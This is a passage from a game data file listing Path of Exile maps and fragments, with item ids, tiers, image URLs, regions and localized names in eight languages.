Hidra",language:{code:"pt"}},{name:"Фрагмент Гидры",language:{code:"ru"}},{name:"Fragmento de la Hidra",language:{code:"es"}},{name:"Fragment of the Hydra",language:{code:"th"}}],region:-1},{id:852,tier:16,tiers:[0,0,0,0,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/ThaumaturgyDungeon.png?scale=1&mn=11&mt=",names:[{name:"Foundry Map",language:{code:"en"}},{name:"Foundry Map",language:{code:"fr"}},{name:"Foundry Map",language:{code:"de"}},{name:"Foundry Map",language:{code:"ko"}},{name:"Foundry Map",language:{code:"pt"}},{name:"Foundry Map",language:{code:"ru"}},{name:"Foundry Map",language:{code:"es"}},{name:"Foundry Map",language:{code:"th"}}],region:3},{id:848,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Stagnation.png?scale=1&mn=11&mt=",names:[{name:"Stagnation Map",language:{code:"en"}},{name:"Stagnation Map",language:{code:"fr"}},{name:"Stagnation Map",language:{code:"de"}},{name:"Stagnation Map",language:{code:"ko"}},{name:"Stagnation Map",language:{code:"pt"}},{name:"Stagnation Map",language:{code:"ru"}},{name:"Stagnation Map",language:{code:"es"}},{name:"Stagnation Map",language:{code:"th"}}],region:7},{id:751,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/KaruiFragment.png",names:[{name:"Timeless Karui Emblem",language:{code:"en"}},{name:"Emblème intemporel des Karuis",language:{code:"fr"}},{name:"Immerwährendes Emblem der Karui",language:{code:"de"}},{name:"무궁한 카루이 상징",language:{code:"ko"}},{name:"Emblema Atemporal Karui",language:{code:"pt"}},{name:"Вневременной знак каруи",language:{code:"ru"}},{name:"Emblema atemporal karui",language:{code:"es"}},{name:"Timeless Karui Emblem",language:{code:"th"}}],region:-1},{id:715,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentPhoenix.png",names:[{name:"Fragment of the Phoenix",language:{code:"en"}},{name:"Fragment du Phénix",language:{code:"fr"}},{name:"Fragment des Phönix",language:{code:"de"}},{name:"불사조의 지도 조각",language:{code:"ko"}},{name:"Fragmento da Fênix",language:{code:"pt"}},{name:"Фрагмент Феникса",language:{code:"ru"}},{name:"Fragmento del Fénix",language:{code:"es"}},{name:"Fragment of the Phoenix",language:{code:"th"}}],region:-1},{id:355,tier:3,tiers:[3,6,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Canyon.png?scale=1&mn=11&mt=",names:[{name:"Canyon Map",language:{code:"en"}},{name:"Canyon, Carte",language:{code:"fr"}},{name:"'Schlucht'-Karte",language:{code:"de"}},{name:"협곡 지도(Canyon Map)",language:{code:"ko"}},{name:"Mapa: Cânion",language:{code:"pt"}},{name:"Карта ущелья",language:{code:"ru"}},{name:"Mapa de Cañón",language:{code:"es"}},{name:"Canyon Map",language:{code:"th"}}],region:5},{id:393,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Armory.png?scale=1&mn=11&mt=",names:[{name:"Armoury Map",language:{code:"en"}},{name:"Armurerie, Carte",language:{code:"fr"}},{name:"'Waffenkammer'-Karte",language:{code:"de"}},{name:"갑주 창고 지도(Armoury Map)",language:{code:"ko"}},{name:"Mapa: Armaria",language:{code:"pt"}},{name:"Карта оружейной",language:{code:"ru"}},{name:"Mapa de Armería",language:{code:"es"}},{name:"Armoury Map",language:{code:"th"}}],region:2},{id:401,tier:14,tiers:[0,0,0,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Tower.png?scale=1&mn=11&mt=",names:[{name:"Tower Map",language:{code:"en"}},{name:"Tour, Carte",language:{code:"fr"}},{name:"'Turm'-Karte",language:{code:"de"}},{name:"탑 지도(Tower Map)",language:{code:"ko"}},{name:"Mapa: Torre",language:{code:"pt"}},{name:"Карта башни",language:{code:"ru"}},{name:"Mapa de la Torre",language:{code:"es"}},{name:"Tower Map",language:{code:"th"}}],region:0},{id:436,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/PrimevalRuins.png?scale=1&mn=11&mt=",names:[{name:"Primordial Blocks Map",language:{code:"en"}},{name:"Vestiges primordiaux, Carte",language:{code:"fr"}},{name:"'Urzeitliche Ruinen'-Karte",language:{code:"de"}},{name:"태고의 구역 지도(Primordial Blocks Map)",language:{code:"ko"}},{name:"Mapa: Blocos Primordiais",language:{code:"pt"}},{name:"Карта первобытного поселения",language:{code:"ru"}},{name:"Mapa de Vestigios Primordiales",language:{code:"es"}},{name:"Primordial Blocks Map",language:{code:"th"}}],region:0},{id:755,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/VaalFragment.png",names:[{name:"Timeless Vaal Emblem",language:{code:"en"}},{name:"Emblème intemporel des Vaal",language:{code:"fr"}},{name:"Immerwährendes Emblem der Vaal",language:{code:"de"}},{name:"무궁한 바알 상징",language:{code:"ko"}},{name:"Emblema Atemporal Vaal",language:{code:"pt"}},{name:"Вневременной знак ваал",language:{code:"ru"}},{name:"Emblema atemporal vaal",language:{code:"es"}},{name:"Timeless Vaal Emblem",language:{code:"th"}}],region:-1},{id:415,tier:9,tiers:[0,0,9,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Precinct.png?scale=1&mn=11&mt=",names:[{name:"Precinct Map",language:{code:"en"}},{name:"Quartier, Carte",language:{code:"fr"}},{name:"'Stadtviertel'-Karte",language:{code:"de"}},{name:"구획 지도(Precinct Map)",language:{code:"ko"}},{name:"Mapa: Precinto",language:{code:"pt"}},{name:"Карта окрестностей",language:{code:"ru"}},{name:"Mapa de Recinto",language:{code:"es"}},{name:"Precinct Map",language:{code:"th"}}],region:5},{id:394,tier:13,tiers:[0,0,0,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Courtyard.png?scale=1&mn=11&mt=",names:[{name:"Courtyard Map",language:{code:"en"}},{name:"Cour, Carte",language:{code:"fr"}},{name:"'Hofgarten'-Karte",language:{code:"de"}},{name:"안뜰 지도(Courtyard Map)",language:{code:"ko"}},{name:"Mapa: Pátio",language:{code:"pt"}},{name:"Карта подворья",language:{code:"ru"}},{name:"Mapa de Patio",language:{code:"es"}},{name:"Courtyard Map",language:{code:"th"}}],region:6},{id:409,tier:10,tiers:[0,0,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Scriptorium.png?scale=1&mn=11&mt=",names:[{name:"Scriptorium Map",language:{code:"en"}},{name:"Scriptorium, Carte",language:{code:"fr"}},{name:"'Skriptorium'-Karte",language:{code:"de"}},{name:"필사실 지도(Scriptorium Map)",language:{code:"ko"}},{name:"Mapa: Scriptorium",language:{code:"pt"}},{name:"Карта скриптория",language:{code:"ru"}},{name:"Mapa de Sala del Escriba",language:{code:"es"}},{name:"Scriptorium Map",language:{code:"th"}}],region:7},{id:420,tier:4,tiers:[4,7,11,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Promenade.png?scale=1&mn=11&mt=",names:[{name:"Promenade Map",language:{code:"en"}},{name:"Esplanade, Carte",language:{code:"fr"}},{name:"'Promenade'-Karte",language:{code:"de"}},{name:"산책로 지도(Promenade Map)",language:{code:"ko"}},{name:"Mapa: Esplanada",language:{code:"pt"}},{name:"Карта прогулочного парка",language:{code:"ru"}},{name:"Mapa de Rambla",language:{code:"es"}},{name:"Promenade Map",language:{code:"th"}}],region:3},{id:379,tier:14,tiers:[0,0,0,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Crematorium.png?scale=1&mn=11&mt=",names:[{name:"Lava Chamber Map",language:{code:"en"}},{name:"Chambre lavique, Carte",language:{code:"fr"}},{name:"'Lavakammer'-Karte",language:{code:"de"}},{name:"용암의 방 지도(Lava Chamber Map)",language:{code:"ko"}},{name:"Mapa: Câmara de Lava",language:{code:"pt"}},{name:"Карта лавовой тюрьмы",language:{code:"ru"}},{name:"Mapa de Cámara de Lava",language:{code:"es"}},{name:"Lava Chamber Map",language:{code:"th"}}],region:3},{id:398,tier:14,tiers:[0,0,0,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/MineralPools.png?scale=1&mn=11&mt=",names:[{name:"Mineral Pools Map",language:{code:"en"}},{name:"Bassins minéraux, Carte",language:{code:"fr"}},{name:"'Mineralquellen'-Karte",language:{code:"de"}},{name:"광물층 지도(Mineral Pools Map)",language:{code:"ko"}},{name:"Mapa: Fontes Minerais",language:{code:"pt"}},{name:"Карта минеральных озёр",language:{code:"ru"}},{name:"Mapa de Charcas Minerales",language:{code:"es"}},{name:"Mineral Pools Map",language:{code:"th"}}],region:0},{id:608,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UniqueMap2.png",names:[{name:"Untainted Paradise",language:{code:"en"}},{name:"Paradis immaculé",language:{code:"fr"}},{name:"Unberührtes Paradies",language:{code:"de"}},{name:"때묻지 않은 낙원(Untainted Paradise)",language:{code:"ko"}},{name:"Paraíso Imaculado",language:{code:"pt"}},{name:"Нетронутый рай",language:{code:"ru"}},{name:"Paraíso Impoluto",language:{code:"es"}},{name:"Untainted Paradise",language:{code:"th"}}],region:-1},{id:441,tier:1,tiers:[1,4,8,10,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Park.png?scale=1&mn=11&mt=",names:[{name:"Park Map",language:{code:"en"}},{name:"Parc, Carte",language:{code:"fr"}},{name:"'Park'-Karte",language:{code:"de"}},{name:"공원 지도(Park Map)",language:{code:"ko"}},{name:"Mapa: Parque",language:{code:"pt"}},{name:"Карта парка",language:{code:"ru"}},{name:"Mapa de Parque",language:{code:"es"}},{name:"Park Map",language:{code:"th"}}],region:1},{id:724,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/ElderComplete.png",names:[{name:"Key to Decay",language:{code:"en"}},{name:"Clé de la Décadence",language:{code:"fr"}},{name:"Schlüssel zum Verfall",language:{code:"de"}},{name:"부패의 열쇠",language:{code:"ko"}},{name:"Chave para a Decadência",language:{code:"pt"}},{name:"Ключ к Порче",language:{code:"ru"}},{name:"Llave hacia el Decaimiento",language:{code:"es"}},{name:"Key to Decay",language:{code:"th"}}],region:-1},{id:418,tier:3,tiers:[3,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Crypt.png?scale=1&mn=11&mt=",names:[{name:"Cursed Crypt Map",language:{code:"en"}},{name:"Crypte maudite, Carte",language:{code:"fr"}},{name:"'Verwunschene Krypta'-Karte",language:{code:"de"}},{name:"저주받은 지하실 지도(Cursed Crypt Map)",language:{code:"ko"}},{name:"Mapa: Cripta Amaldiçoada",language:{code:"pt"}},{name:"Карта проклятого склепа",language:{code:"ru"}},{name:"Mapa de Cripta Maldita",language:{code:"es"}},{name:"Cursed Crypt Map",language:{code:"th"}}],region:1},{id:372,tier:3,tiers:[3,6,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Wharf.png?scale=1&mn=11&mt=",names:[{name:"Wharf Map",language:{code:"en"}},{name:"Embarcadère, Carte",language:{code:"fr"}},{name:"'Hafen'-Karte",language:{code:"de"}},{name:"부두 지도(Wharf Map)",language:{code:"ko"}},{name:"Mapa: Cais",language:{code:"pt"}},{name:"Карта пристани",language:{code:"ru"}},{name:"Mapa de Embarcadero",language:{code:"es"}},{name:"Wharf Map",language:{code:"th"}}],region:6},{id:397,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/TropicalIsland.png?scale=1&mn=11&mt=",names:[{name:"Tropical Island Map",language:{code:"en"}},{name:"Île tropicale, Carte",language:{code:"fr"}},{name:"'Tropische Insel'-Karte",language:{code:"de"}},{name:"열대 섬 지도(Tropical Island Map)",language:{code:"ko"}},{name:"Mapa: Ilha Tropical",language:{code:"pt"}},{name:"Карта тропического острова",language:{code:"ru"}},{name:"Mapa de Isla Tropical",language:{code:"es"}},{name:"Tropical Island Map",language:{code:"th"}}],region:1},{id:614,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PerandusManor.png",names:[{name:"The Perandus Manor",language:{code:"en"}},{name:"Le Manoir des Pérandus",language:{code:"fr"}},{name:"Das Perandus-Anwesen",language:{code:"de"}},{name:"페란두스 저택(The Perandus Manor)",language:{code:"ko"}},{name:"A Mansão Perandus",language:{code:"pt"}},{name:"Особняк Перандусов",language:{code:"ru"}},{name:"La Mansión Perandus",language:{code:"es"}},{name:"The Perandus Manor",language:{code:"th"}}],region:-1},{id:400,tier:3,tiers:[3,7,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Sepulchre.png?scale=1&mn=11&mt=",names:[{name:"Sepulchre Map",language:{code:"en"}},{name:"Sépulcre, Carte",language:{code:"fr"}},{name:"'Grabstätte'-Karte",language:{code:"de"}},{name:"매장소 지도(Sepulchre Map)",language:{code:"ko"}},{name:"Mapa: Sepulcro",language:{code:"pt"}},{name:"Карта усыпальницы",language:{code:"ru"}},{name:"Mapa de Sepulcro",language:{code:"es"}},{name:"Sepulchre Map",language:{code:"th"}}],region:7},{id:857,tier:11,tiers:[0,0,0,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/ForkingRiver.png?scale=1&mn=11&mt=",names:[{name:"Forking River Map",language:{code:"en"}},{name:"Forking River Map",language:{code:"fr"}},{name:"Forking River Map",language:{code:"de"}},{name:"Forking River Map",language:{code:"ko"}},{name:"Forking River Map",language:{code:"pt"}},{name:"Forking River Map",language:{code:"ru"}},{name:"Forking River Map",language:{code:"es"}},{name:"Forking River Map",language:{code:"th"}}],region:6},{id:462,tier:16,tiers:[16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Minotaur.png?scale=1&mn=11&mt=",names:[{name:"Maze of the Minotaur Map",language:{code:"en"}},{name:"Dédale du Minotaure, Carte",language:{code:"fr"}},{name:"'Labyrinth des Minotauren'-Karte",language:{code:"de"}},{name:"미노타우로스의 미로 지도(Maze of the Minotaur Map)",language:{code:"ko"}},{name:"Mapa: Labirinto do Minotauro",language:{code:"pt"}},{name:"Карта лабиринта Минотавра",language:{code:"ru"}},{name:"Mapa de Laberinto del Minotauro",language:{code:"es"}},{name:"Maze of the Minotaur Map",language:{code:"th"}}],region:-1},{id:404,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Estuary.png?scale=1&mn=11&mt=",names:[{name:"Estuary Map",language:{code:"en"}},{name:"Estuaire, Carte",language:{code:"fr"}},{name:"'Flussmündung'-Karte",language:{code:"de"}},{name:"강어귀 지도(Estuary Map)",language:{code:"ko"}},{name:"Mapa: Estuário",language:{code:"pt"}},{name:"Карта устья реки",language:{code:"ru"}},{name:"Mapa de Estuario",language:{code:"es"}},{name:"Estuary Map",language:{code:"th"}}],region:6},{id:702,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal03.png",names:[{name:"Sacrifice at Noon",language:{code:"en"}},{name:"Sacrifice de midi",language:{code:"fr"}},{name:"Opfergabe bei Mittag",language:{code:"de"}},{name:"정오의 희생",language:{code:"ko"}},{name:"Sacrifício ao Meio Dia",language:{code:"pt"}},{name:"Жертва в полдень",language:{code:"ru"}},{name:"Sacrificio al Mediodía",language:{code:"es"}},{name:"Sacrifice at Noon",language:{code:"th"}}],region:-1},{id:455,tier:14,tiers:[0,0,0,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Corpse.png?scale=1&mn=11&mt=",names:[{name:"Lava Lake Map",language:{code:"en"}},{name:"Lac de lave, Carte",language:{code:"fr"}},{name:"'Lavasee'-Karte",language:{code:"de"}},{name:"용암 호수 지도(Lava Lake Map)",language:{code:"ko"}},{name:"Mapa: Lago de Lava",language:{code:"pt"}},{name:"Карта лавового озера",language:{code:"ru"}},{name:"Mapa de Lago de Lava",language:{code:"es"}},{name:"Lava Lake Map",language:{code:"th"}}],region:7},{id:349,tier:4,tiers:[4,7,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Strand.png?scale=1&mn=11&mt=",names:[{name:"Strand Map",language:{code:"en"}},{name:"Rivage, Carte",language:{code:"fr"}},{name:"'Küste'-Karte",language:{code:"de"}},{name:"해안 지도(Strand Map)",language:{code:"ko"}},{name:"Mapa: Costa",language:{code:"pt"}},{name:"Карта взморья",language:{code:"ru"}},{name:"Mapa de Litoral",language:{code:"es"}},{name:"Strand Map",language:{code:"th"}}],region:5},{id:440,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Ghetto.png?scale=1&mn=11&mt=",names:[{name:"Ghetto Map",language:{code:"en"}},{name:"Ghetto, Carte",language:{code:"fr"}},{name:"'Elendsviertel'-Karte",language:{code:"de"}},{name:"빈민촌 지도(Ghetto Map)",language:{code:"ko"}},{name:"Mapa: Gueto",language:{code:"pt"}},{name:"Карта хибар",language:{code:"ru"}},{name:"Mapa de Gueto",language:{code:"es"}},{name:"Ghetto Map",language:{code:"th"}}],region:5},{id:335,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Marshes.png?scale=1&mn=11&mt=",names:[{name:"Marshes Map",language:{code:"en"}},{name:"Marécage, Carte",language:{code:"fr"}},{name:"'Marschlande'-Karte",language:{code:"de"}},{name:"습지 지도(Marshes Map)",language:{code:"ko"}},{name:"Mapa: Pântano",language:{code:"pt"}},{name:"Карта болот",language:{code:"ru"}},{name:"Mapa de Marjales",language:{code:"es"}},{name:"Marshes Map",language:{code:"th"}}],region:5},{id:453,tier:10,tiers:[0,0,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Dig.png?scale=1&mn=11&mt=",names:[{name:"Dig Map",language:{code:"en"}},{name:"Déblai, Carte",language:{code:"fr"}},{name:"'Ausgrabung'-Karte",language:{code:"de"}},{name:"발굴지 지도(Dig Map)",language:{code:"ko"}},{name:"Mapa: Cavidade",language:{code:"pt"}},{name:"Карта развалин",language:{code:"ru"}},{name:"Mapa de Perforación",language:{code:"es"}},{name:"Dig Map",language:{code:"th"}}],region:2},{id:412,tier:4,tiers:[4,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Belfry.png?scale=1&mn=11&mt=",names:[{name:"Belfry Map",language:{code:"en"}},{name:"Beffroi, Carte",language:{code:"fr"}},{name:"'Glockenturm'-Karte",language:{code:"de"}},{name:"종탑 지도(Belfry Map)",language:{code:"ko"}},{name:"Mapa: Campanário",language:{code:"pt"}},{name:"Карта колокольни",language:{code:"ru"}},{name:"Mapa de Campanario",language:{code:"es"}},{name:"Belfry Map",language:{code:"th"}}],region:0},{id:619,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/HarbingerRed.png",names:[{name:"The Beachhead",language:{code:"en"}},{name:"La Tête de pont",language:{code:"fr"}},{name:"Der Brückenkopf",language:{code:"de"}},{name:"교두보(The Beachhead)",language:{code:"ko"}},{name:"A Cabeça de Ponte",language:{code:"pt"}},{name:"Плацдарм",language:{code:"ru"}},{name:"La Cabecera de la Playa",language:{code:"es"}},{name:"The Beachhead",language:{code:"th"}}],region:-1},{id:429,tier:4,tiers:[4,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Pit1.png?scale=1&mn=11&mt=",names:[{name:"Pit Map",language:{code:"en"}},{name:"Fosse, Carte",language:{code:"fr"}},{name:"'Grube'-Karte",language:{code:"de"}},{name:"구덩이 지도(Pit Map)",language:{code:"ko"}},{name:"Mapa: Fosso",language:{code:"pt"}},{name:"Карта ямы",language:{code:"ru"}},{name:"Mapa de Hoyo",language:{code:"es"}},{name:"Pit Map",language:{code:"th"}}],region:3},{id:358,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Chambers.png?scale=1&mn=11&mt=",names:[{name:"Haunted Mansion Map",language:{code:"en"}},{name:"Manoir hanté, Carte",language:{code:"fr"}},{name:"'Geistervilla'-Karte",language:{code:"de"}},{name:"으스스한 대저택 지도(Haunted Mansion Map)",language:{code:"ko"}},{name:"Mapa: Mansão Assombrada",language:{code:"pt"}},{name:"Карта дома с привидениями",language:{code:"ru"}},{name:"Mapa de Mansión Embrujada",language:{code:"es"}},{name:"Haunted Mansion Map",language:{code:"th"}}],region:2},{id:847,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/DesertShipGraveyard.png?scale=1&mn=11&mt=",names:[{name:"Dry Sea Map",language:{code:"en"}},{name:"Dry Sea Map",language:{code:"fr"}},{name:"Dry Sea Map",language:{code:"de"}},{name:"Dry Sea Map",language:{code:"ko"}},{name:"Dry Sea Map",language:{code:"pt"}},{name:"Dry Sea Map",language:{code:"ru"}},{name:"Dry Sea Map",language:{code:"es"}},{name:"Dry Sea Map",language:{code:"th"}}],region:5},{id:732,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsCold.png",names:[{name:"Tul's Breachstone",language:{code:"en"}},{name:"Pierre de Brèche de Tul",language:{code:"fr"}},{name:"Tuls Riss-Stein",language:{code:"de"}},{name:"툴의 균열석",language:{code:"ko"}},{name:"Pedra da Fenda de Tul",language:{code:"pt"}},{name:"Камень Разлома Тул",language:{code:"ru"}},{name:"Piedra de Fisura de Tul",language:{code:"es"}},{name:"Tul's Breachstone",language:{code:"th"}}],region:-1},{id:332,tier:5,tiers:[5,8,12,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Desert.png?scale=1&mn=11&mt=",names:[{name:"Desert Map",language:{code:"en"}},{name:"Désert, Carte",language:{code:"fr"}},{name:"'Wüste'-Karte",language:{code:"de"}},{name:"사막 지도(Desert Map)",language:{code:"ko"}},{name:"Mapa: Deserto",language:{code:"pt"}},{name:"Карта пустыни",language:{code:"ru"}},{name:"Mapa de Desierto",language:{code:"es"}},{name:"Desert Map",language:{code:"th"}}],region:0},{id:331,tier:4,tiers:[4,7,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Pen.png?scale=1&mn=11&mt=",names:[{name:"Pen Map",language:{code:"en"}},{name:"Enclos, Carte",language:{code:"fr"}},{name:"'Pferch'-Karte",language:{code:"de"}},{name:"우리 지도(Pen Map)",language:{code:"ko"}},{name:"Mapa: Estábulo",language:{code:"pt"}},{name:"Карта загона",language:{code:"ru"}},{name:"Mapa de Corral",language:{code:"es"}},{name:"Pen Map",language:{code:"th"}}],region:0},{id:356,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Baths.png?scale=1&mn=11&mt=",names:[{name:"Conservatory Map",language:{code:"en"}},{name:"Atrium, Carte",language:{code:"fr"}},{name:"'Konservatorium'-Karte",language:{code:"de"}},{name:"온실 지도(Conservatory Map)",language:{code:"ko"}},{name:"Mapa: Conservatório",language:{code:"pt"}},{name:"Карта зимнего сада",language:{code:"ru"}},{name:"Mapa de Conservatorio",language:{code:"es"}},{name:"Conservatory Map",language:{code:"th"}}],region:6},{id:330,tier:12,tiers:[0,0,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Alleyways.png?scale=1&mn=11&mt=",names:[{name:"Alleyways Map",language:{code:"en"}},{name:"Ruelles, Carte",language:{code:"fr"}},{name:"'Gassen'-Karte",language:{code:"de"}},{name:"골목길 지도(Alleyways Map)",language:{code:"ko"}},{name:"Mapa: Becos",language:{code:"pt"}},{name:"Карта переулка",language:{code:"ru"}},{name:"Mapa de Callejones",language:{code:"es"}},{name:"Alleyways Map",language:{code:"th"}}],region:4},{id:345,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Arcade.png?scale=1&mn=11&mt=",names:[{name:"Arcade Map",language:{code:"en"}},{name:"Arcades, Carte",language:{code:"fr"}},{name:"'Arkaden'-Karte",language:{code:"de"}},{name:"상점가 지도(Arcade Map)",language:{code:"ko"}},{name:"Mapa: Arcada",language:{code:"pt"}},{name:"Карта агоры",language:{code:"ru"}},{name:"Mapa de Galería",language:{code:"es"}},{name:"Arcade Map",language:{code:"th"}}],region:0},{id:442,tier:5,tiers:[0,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Malformation.png?scale=1&mn=11&mt=",names:[{name:"Malformation Map",language:{code:"en"}},{name:"Malformation, Carte",language:{code:"fr"}},{name:"'Missbildung'-Karte",language:{code:"de"}},{name:"기형 지도(Malformation Map)",language:{code:"ko"}},{name:"Mapa: Malformação",language:{code:"pt"}},{name:"Карта недр",language:{code:"ru"}},{name:"Mapa de Malformación",language:{code:"es"}},{name:"Malformation Map",language:{code:"th"}}],region:2},{id:411,tier:3,tiers:[3,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Shipyard.png?scale=1&mn=11&mt=",names:[{name:"Shipyard Map",language:{code:"en"}},{name:"Chantier naval, Carte",language:{code:"fr"}},{name:"'Werft'-Karte",language:{code:"de"}},{name:"조선소 지도(Shipyard Map)",language:{code:"ko"}},{name:"Mapa: Estaleiro",language:{code:"pt"}},{name:"Карта верфи",language:{code:"ru"}},{name:"Mapa de Astillero",language:{code:"es"}},{name:"Shipyard Map",language:{code:"th"}}],region:4},{id:452,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Plaza.png?scale=1&mn=11&mt=",names:[{name:"Plaza Map",language:{code:"en"}},{name:"Square, Carte",language:{code:"fr"}},{name:"'Vorplatz'-Karte",language:{code:"de"}},{name:"광장 지도(Plaza Map)",language:{code:"ko"}},{name:"Mapa: Praça",language:{code:"pt"}},{name:"Карта площади",language:{code:"ru"}},{name:"Mapa de Plaza",language:{code:"es"}},{name:"Plaza Map",language:{code:"th"}}],region:2},{id:621,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Doryanis.png",names:[{name:"Doryani's Machinarium",language:{code:"en"}},{name:"Le Machinarium de Doryani",language:{code:"fr"}},{name:"Doryanis Machinarium",language:{code:"de"}},{name:"도리아니의 기계실(Doryani's Machinarium)",language:{code:"ko"}},{name:"Maquinário de Doryani",language:{code:"pt"}},{name:"Машинариум Дориани",language:{code:"ru"}},{name:"Taller de Máquinas de Doryani",language:{code:"es"}},{name:"Doryani's Machinarium",language:{code:"th"}}],region:-1},{id:463,tier:16,tiers:[16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Phoenix.png?scale=1&mn=11&mt=",names:[{name:"Forge of the Phoenix Map",language:{code:"en"}},{name:"Forge du Phénix, Carte",language:{code:"fr"}},{name:"'Schmiede des Phönix'-Karte",language:{code:"de"}},{name:"불사조의 대장간 지도(Forge of the Phoenix Map)",language:{code:"ko"}},{name:"Mapa: Fornalha da Fênix ",language:{code:"pt"}},{name:"Карта кузницы Феникса",language:{code:"ru"}},{name:"Mapa de Forja del Fénix",language:{code:"es"}},{name:"Forge of the Phoenix Map",language:{code:"th"}}],region:-1},{id:327,tier:1,tiers:[1,4,8,10,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Beach.png?scale=1&mn=11&mt=",names:[{name:"Beach Map",language:{code:"en"}},{name:"Plage, Carte",language:{code:"fr"}},{name:"'Strand'-Karte",language:{code:"de"}},{name:"해변 지도(Beach Map)",language:{code:"ko"}},{name:"Mapa: Praia",language:{code:"pt"}},{name:"Карта пляжа",language:{code:"ru"}},{name:"Mapa de Playa",language:{code:"es"}},{name:"Beach Map",language:{code:"th"}}],region:5},{id:421,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Lair.png?scale=1&mn=11&mt=",names:[{name:"Lair Map",language:{code:"en"}},{name:"Antre, Carte",language:{code:"fr"}},{name:"'Lager'-Karte",language:{code:"de"}},{name:"소굴 지도(Lair Map)",language:{code:"ko"}},{name:"Mapa: Covil",language:{code:"pt"}},{name:"Карта логова",language:{code:"ru"}},{name:"Mapa de Guarida",language:{code:"es"}},{name:"Lair Map",language:{code:"th"}}],region:6},{id:375,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Cemetery.png?scale=1&mn=11&mt=",names:[{name:"Cemetery Map",language:{code:"en"}},{name:"Cimetière, Carte",language:{code:"fr"}},{name:"'Totenacker'-Karte",language:{code:"de"}},{name:"공동묘지 지도(Cemetery Map)",language:{code:"ko"}},{name:"Mapa: Cemitério",language:{code:"pt"}},{name:"Карта погоста",language:{code:"ru"}},{name:"Mapa de Camposanto",language:{code:"es"}},{name:"Cemetery Map",language:{code:"th"}}],region:1},{id:391,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/VaalPyramid.png?scale=1&mn=11&mt=",names:[{name:"Vaal Pyramid Map",language:{code:"en"}},{name:"Pyramide vaal, 